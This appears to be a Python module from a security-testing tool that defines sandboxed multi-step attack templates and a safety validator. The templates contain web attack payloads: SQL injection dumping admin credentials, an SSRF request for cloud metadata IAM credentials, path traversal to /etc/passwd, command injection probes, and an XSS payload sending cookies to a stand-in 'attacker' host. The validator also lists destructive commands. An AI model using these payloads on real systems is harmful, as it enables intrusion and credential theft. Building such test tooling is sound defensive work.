"""
Project Aura - Attack Template Service

Provides predefined attack chains and templates for security testing
in sandboxed environments. Supports multi-step attack scenarios
for vulnerability validation.

Part of AWS Security Agent capability parity (ADR-019 Gap 3).

CRITICAL SAFETY CONTROLS:
- All attacks MUST execute in sandbox environments only
- Production execution is strictly forbidden
- Time limits enforced on all operations
- HITL approval required for CRITICAL severity chains

Author: Project Aura Team
Created: 2025-12-03
Version: 1.0.0
"""

import logging
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from typing import Any

logger = logging.getLogger(__name__)


class AttackCategory(Enum):
    """Categories of attack templates."""

    SQL_INJECTION = "sql_injection"
    AUTHENTICATION_BYPASS = "authentication_bypass"
    SSRF = "ssrf"
    COMMAND_INJECTION = "command_injection"
    XSS = "xss"
    PATH_TRAVERSAL = "path_traversal"
    DESERIALIZATION = "deserialization"
    XXE = "xxe"


class AttackPhase(Enum):
    """Phases of a multi-step attack."""

    RECONNAISSANCE = "reconnaissance"
    PROBE = "probe"
    EXPLOIT = "exploit"
    ESCALATE = "escalate"
    EXFILTRATE = "exfiltrate"
    PERSIST = "persist"


class Severity(Enum):
    """Severity levels for attack chains."""

    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"


@dataclass
class AttackStep:
    """A single step in an attack chain."""

    step_id: str
    phase: AttackPhase
    name: str
    description: str
    payload: str
    expected_response: str | None = None
    success_indicator: str | None = None
    timeout_seconds: int = 30
    requires_previous_output: bool = False
    parameter_extraction: dict[str, str] = field(default_factory=dict)


@dataclass
class AttackChain:
    """A multi-step attack chain template."""

    chain_id: str
    name: str
    category: AttackCategory
    severity: Severity
    description: str
    steps: list[AttackStep]
    prerequisites: list[str] = field(default_factory=list)
    target_vulnerability_types: list[str] = field(default_factory=list)
    max_duration_seconds: int = 300  # 5 minutes default
    requires_hitl_approval: bool = False
    cwe_ids: list[str] = field(default_factory=list)
    created_at: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary for serialization."""
        return {
            "chain_id": self.chain_id,
            "name": self.name,
            "category": self.category.value,
            "severity": self.severity.value,
            "description": self.description,
            "steps": [
                {
                    "step_id": s.step_id,
                    "phase": s.phase.value,
                    "name": s.name,
                    "description": s.description,
                    "payload": s.payload,
                    "timeout_seconds": s.timeout_seconds,
                }
                for s in self.steps
            ],
            "target_vulnerability_types": self.target_vulnerability_types,
            "max_duration_seconds": self.max_duration_seconds,
            "requires_hitl_approval": self.requires_hitl_approval,
            "cwe_ids": self.cwe_ids,
        }


@dataclass
class AttackResult:
    """Result of executing an attack step or chain."""

    success: bool
    step_id: str | None = None
    chain_id: str | None = None
    phase: AttackPhase | None = None
    response: str | None = None
    extracted_data: dict[str, Any] = field(default_factory=dict)
    error: str | None = None
    duration_seconds: float = 0.0
    timestamp: str = field(
        default_factory=lambda: datetime.now(timezone.utc).isoformat()
    )


# =============================================================================
# Predefined Attack Templates
# =============================================================================


SQL_INJECTION_CHAIN = AttackChain(
    chain_id="sqli-001",
    name="SQL Injection Chain",
    category=AttackCategory.SQL_INJECTION,
    severity=Severity.CRITICAL,
    description="Multi-step SQL injection attack: probe -> extract -> escalate",
    steps=[
        AttackStep(
            step_id="sqli-001-probe",
            phase=AttackPhase.PROBE,
            name="SQL Injection Probe",
            description="Test for SQL injection vulnerability with simple payload",
            payload="' OR '1'='1",
            expected_response="Login successful",
            success_indicator="authentication bypass",
        ),
        AttackStep(
            step_id="sqli-001-extract",
            phase=AttackPhase.EXPLOIT,
            name="Database Schema Extraction",
            description="Extract database schema using UNION injection",
            payload="' UNION SELECT table_name,column_name FROM information_schema.columns--",
            success_indicator="table_name",
            requires_previous_output=True,
        ),
        AttackStep(
            step_id="sqli-001-escalate",
            phase=AttackPhase.ESCALATE,
            name="Privilege Escalation via SQLi",
            description="Attempt to extract admin credentials or elevate privileges",
            payload="' UNION SELECT username,password FROM users WHERE role='admin'--",
            success_indicator="admin",
            requires_previous_output=True,
        ),
    ],
    prerequisites=["SQL-based authentication", "Error messages visible"],
    target_vulnerability_types=["SQL_INJECTION", "AUTH_BYPASS"],
    max_duration_seconds=300,
    requires_hitl_approval=True,
    cwe_ids=["CWE-89", "CWE-287"],
)

AUTH_BYPASS_CHAIN = AttackChain(
    chain_id="auth-001",
    name="Authentication Bypass Chain",
    category=AttackCategory.AUTHENTICATION_BYPASS,
    severity=Severity.CRITICAL,
    description="Multi-vector authentication bypass: JWT -> session -> IDOR",
    steps=[
        AttackStep(
            step_id="auth-001-jwt",
            phase=AttackPhase.PROBE,
            name="JWT Algorithm Confusion",
            description="Test for JWT algorithm confusion vulnerability",
            payload='{"alg":"none","typ":"JWT"}',
            success_indicator="token accepted",
        ),
        AttackStep(
            step_id="auth-001-session",
            phase=AttackPhase.EXPLOIT,
            name="Session Fixation",
            description="Attempt session fixation attack",
            payload="Set-Cookie: session_id=attacker_controlled_value",
            success_indicator="session hijacked",
            requires_previous_output=True,
        ),
        AttackStep(
            step_id="auth-001-idor",
            phase=AttackPhase.ESCALATE,
            name="IDOR Exploitation",
            description="Access resources using manipulated IDs",
            payload="/api/users/1/admin_data",
            success_indicator="admin_data",
            requires_previous_output=True,
        ),
    ],
    prerequisites=["JWT authentication", "Session management"],
    target_vulnerability_types=["JWT_VULNERABILITY", "SESSION_FIXATION", "IDOR"],
    max_duration_seconds=300,
    requires_hitl_approval=True,
    cwe_ids=["CWE-287", "CWE-384", "CWE-639"],
)

SSRF_CHAIN = AttackChain(
    chain_id="ssrf-001",
    name="SSRF Attack Chain",
    category=AttackCategory.SSRF,
    severity=Severity.HIGH,
    description="SSRF exploitation: exploit -> enumerate -> metadata access",
    steps=[
        AttackStep(
            step_id="ssrf-001-probe",
            phase=AttackPhase.PROBE,
            name="SSRF Probe",
            description="Test for SSRF vulnerability with internal URL",
            payload="http://127.0.0.1:80/",
            success_indicator="local response",
        ),
        AttackStep(
            step_id="ssrf-001-enumerate",
            phase=AttackPhase.EXPLOIT,
            name="Internal Service Enumeration",
            description="Enumerate internal services via SSRF",
            payload="http://internal-service:8080/health",
            success_indicator="service response",
            requires_previous_output=True,
        ),
        AttackStep(
            step_id="ssrf-001-metadata",
            phase=AttackPhase.ESCALATE,
            name="Cloud Metadata Access",
            description="Attempt to access cloud instance metadata",
            payload="http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            success_indicator="aws credentials",
            requires_previous_output=True,
        ),
    ],
    prerequisites=["URL parameter", "HTTP client functionality"],
    target_vulnerability_types=["SSRF"],
    max_duration_seconds=180,
    requires_hitl_approval=True,
    cwe_ids=["CWE-918"],
)

COMMAND_INJECTION_CHAIN = AttackChain(
    chain_id="cmdi-001",
    name="Command Injection Chain",
    category=AttackCategory.COMMAND_INJECTION,
    severity=Severity.CRITICAL,
    description="Command injection: inject -> escape -> shell access",
    steps=[
        AttackStep(
            step_id="cmdi-001-probe",
            phase=AttackPhase.PROBE,
            name="Command Injection Probe",
            description="Test for command injection with simple payload",
            payload="; id",
            success_indicator="uid=",
        ),
        AttackStep(
            step_id="cmdi-001-escape",
            phase=AttackPhase.EXPLOIT,
            name="Shell Escape",
            description="Attempt to break out of restricted shell",
            payload="$(whoami)",
            success_indicator="username",
            requires_previous_output=True,
        ),
        AttackStep(
            step_id="cmdi-001-shell",
            phase=AttackPhase.ESCALATE,
            name="Reverse Shell Attempt",
            description="Attempt to establish reverse shell (blocked in sandbox)",
            payload="/bin/bash -c 'echo vulnerable'",
            success_indicator="vulnerable",
            requires_previous_output=True,
            timeout_seconds=10,
        ),
    ],
    prerequisites=["Shell command execution", "User input in command"],
    target_vulnerability_types=["COMMAND_INJECTION", "OS_COMMAND_INJECTION"],
    max_duration_seconds=120,
    requires_hitl_approval=True,
    cwe_ids=["CWE-78", "CWE-77"],
)

XSS_CHAIN = AttackChain(
    chain_id="xss-001",
    name="XSS Attack Chain",
    category=AttackCategory.XSS,
    severity=Severity.MEDIUM,
    description="XSS exploitation: reflect -> store -> session steal",
    steps=[
        AttackStep(
            step_id="xss-001-reflect",
            phase=AttackPhase.PROBE,
            name="Reflected XSS Test",
            description="Test for reflected XSS vulnerability",
            payload="<script>alert('XSS')</script>",
            success_indicator="script tag in response",
        ),
        AttackStep(
            step_id="xss-001-store",
            phase=AttackPhase.EXPLOIT,
            name="Stored XSS Injection",
            description="Inject persistent XSS payload",
            payload="<img src=x onerror='fetch(\"/api/log?c=\"+document.cookie)'>",
            success_indicator="payload stored",
            requires_previous_output=True,
        ),
        AttackStep(
            step_id="xss-001-session",
            phase=AttackPhase.ESCALATE,
            name="Session Token Exfiltration",
            description="Exfiltrate session token via XSS",
            payload="<script>new Image().src='http://attacker/steal?c='+document.cookie</script>",
            success_indicator="cookie exfiltrated",
            requires_previous_output=True,
        ),
    ],
    prerequisites=["User input reflection", "No CSP or weak CSP"],
    target_vulnerability_types=["XSS", "REFLECTED_XSS", "STORED_XSS"],
    max_duration_seconds=180,
    requires_hitl_approval=False,
    cwe_ids=["CWE-79"],
)

PATH_TRAVERSAL_CHAIN = AttackChain(
    chain_id="path-001",
    name="Path Traversal Chain",
    category=AttackCategory.PATH_TRAVERSAL,
    severity=Severity.HIGH,
    description="Path traversal: probe -> file access -> config extraction",
    steps=[
        AttackStep(
            step_id="path-001-probe",
            phase=AttackPhase.PROBE,
            name="Path Traversal Probe",
            description="Test for path traversal vulnerability",
            payload="../../../etc/passwd",
            success_indicator="root:",
        ),
        AttackStep(
            step_id="path-001-config",
            phase=AttackPhase.EXPLOIT,
            name="Configuration File Access",
            description="Access application configuration files",
            payload="../../../app/config/database.yml",
            success_indicator="password:",
            requires_previous_output=True,
        ),
        AttackStep(
            step_id="path-001-source",
            phase=AttackPhase.ESCALATE,
            name="Source Code Access",
            description="Access application source code",
            payload="../../../app/main.py",
            success_indicator="import",
            requires_previous_output=True,
        ),
    ],
    prerequisites=["File path parameter", "No path sanitization"],
    target_vulnerability_types=["PATH_TRAVERSAL", "LFI"],
    max_duration_seconds=120,
    requires_hitl_approval=False,
    cwe_ids=["CWE-22", "CWE-23"],
)


class AttackTemplateService:
    """
    Service for managing and providing attack chain templates.

    SAFETY: All templates are designed for sandbox-only execution.
    Production environment execution is strictly forbidden.

    Usage:
        service = AttackTemplateService()
        chain = service.get_chain("sqli-001")
        chains = service.get_chains_for_vulnerability("SQL_INJECTION")
    """

    def __init__(self) -> None:
        """Initialize the attack template service with predefined chains."""
        self._chains: dict[str, AttackChain] = {}
        self._load_predefined_chains()

    def _load_predefined_chains(self) -> None:
        """Load all predefined attack chains."""
        predefined = [
            SQL_INJECTION_CHAIN,
            AUTH_BYPASS_CHAIN,
            SSRF_CHAIN,
            COMMAND_INJECTION_CHAIN,
            XSS_CHAIN,
            PATH_TRAVERSAL_CHAIN,
        ]

        for chain in predefined:
            self._chains[chain.chain_id] = chain
            logger.debug(f"Loaded attack chain: {chain.chain_id} - {chain.name}")

        logger.info(f"Loaded {len(self._chains)} predefined attack chains")

    def get_chain(self, chain_id: str) -> AttackChain | None:
        """Get an attack chain by ID."""
        return self._chains.get(chain_id)

    def get_all_chains(self) -> list[AttackChain]:
        """Get all available attack chains."""
        return list(self._chains.values())

    def get_chains_by_category(
        self,
        category: AttackCategory,
    ) -> list[AttackChain]:
        """Get attack chains by category."""
        return [c for c in self._chains.values() if c.category == category]

    def get_chains_by_severity(
        self,
        severity: Severity,
    ) -> list[AttackChain]:
        """Get attack chains by severity level."""
        return [c for c in self._chains.values() if c.severity == severity]

    def get_chains_for_vulnerability(
        self,
        vulnerability_type: str,
    ) -> list[AttackChain]:
        """Get attack chains targeting a specific vulnerability type."""
        vuln_upper = vulnerability_type.upper()
        return [
            c
            for c in self._chains.values()
            if vuln_upper in [v.upper() for v in c.target_vulnerability_types]
        ]

    def get_chains_requiring_hitl(self) -> list[AttackChain]:
        """Get all chains that require HITL approval."""
        return [c for c in self._chains.values() if c.requires_hitl_approval]

    def get_safe_chains(self) -> list[AttackChain]:
        """Get chains that don't require HITL approval (lower risk)."""
        return [c for c in self._chains.values() if not c.requires_hitl_approval]

    def register_custom_chain(self, chain: AttackChain) -> bool:
        """
        Register a custom attack chain.

        SAFETY: Custom chains should be reviewed before use.

        Args:
            chain: The attack chain to register

        Returns:
            True if registered successfully
        """
        if chain.chain_id in self._chains:
            logger.warning(f"Chain {chain.chain_id} already exists, skipping")
            return False

        # Validate chain has required safety attributes
        if chain.severity == Severity.CRITICAL and not chain.requires_hitl_approval:
            logger.warning(
                f"CRITICAL chain {chain.chain_id} must require HITL approval"
            )
            chain.requires_hitl_approval = True

        self._chains[chain.chain_id] = chain
        logger.info(f"Registered custom chain: {chain.chain_id}")
        return True

    def validate_chain(self, chain: AttackChain) -> list[str]:
        """
        Validate an attack chain for safety and completeness.

        Returns:
            List of validation errors (empty if valid)
        """
        errors: list[str] = []

        if not chain.chain_id:
            errors.append("Chain ID is required")

        if not chain.steps:
            errors.append("Chain must have at least one step")

        if chain.max_duration_seconds > 1800:  # 30 minutes
            errors.append("Max duration exceeds 30 minute limit")

        if chain.severity == Severity.CRITICAL and not chain.requires_hitl_approval:
            errors.append("CRITICAL severity chains require HITL approval")

        # Check for dangerous payloads
        dangerous_patterns = [
            "rm -rf",
            "format c:",
            "dd if=/dev/zero",
            "> /dev/sda",
        ]

        for step in chain.steps:
            for pattern in dangerous_patterns:
                if pattern in step.payload.lower():
                    errors.append(f"Step {step.step_id} contains dangerous payload")

        return errors


# =============================================================================
# Factory Function
# =============================================================================


def create_attack_template_service() -> AttackTemplateService:
    """Create an AttackTemplateService instance."""
    return AttackTemplateService()
